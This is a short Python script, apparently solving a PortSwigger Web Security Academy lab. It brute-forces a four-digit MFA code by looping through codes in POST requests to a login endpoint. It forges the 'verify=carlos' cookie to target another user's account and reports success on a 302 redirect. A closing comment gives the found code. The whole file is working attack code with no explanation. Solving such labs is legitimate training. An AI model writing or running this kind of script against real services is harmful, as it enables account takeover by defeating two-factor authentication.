import requests

# The target URL of the login page
target_url = "https://0a0c00340497ad6a81ec436400470011.web-security-academy.net/login2"

# The range of numbers for the parameter
parameter_range = range(0000, 9999)


def send_login_request(mfa_code):
    # Define the POST data with the parameter to brute-force
    login_data = {"mfa-code": mfa_code}

    # Define the headers
    headers = {
        "Host": "0a0c00340497ad6a81ec436400470011.web-security-academy.net",
        "Cookie": "verify=carlos; session=gOBQVhOgvn5E3ABHTjNhib9AdVXMz1tt",
        "Content-Length": "13",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": "",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '""',
        "Upgrade-Insecure-Requests": "1",
        "Origin": "https://0a0c00340497ad6a81ec436400470011.web-security-academy.net",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://0a0c00340497ad6a81ec436400470011.web-security-academy.net/login2",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }

    # Send the POST request to the login page
    response = requests.post(
        target_url, data=login_data, headers=headers, allow_redirects=False
    )

    # Check the response status code to see if it's a 302 Redirect
    if response.status_code == 302:
        print(f"Login successful! MFA code found: {mfa_code}")
        return True
    else:
        print(f"Login failed with MFA code: {mfa_code}")
        return False


for value in parameter_range:
    mfa_code = str(value).zfill(4)  # Format the number as a 4-digit string
    if send_login_request(mfa_code):
        break

print("Brute-forcing completed.")

# the output was 0431
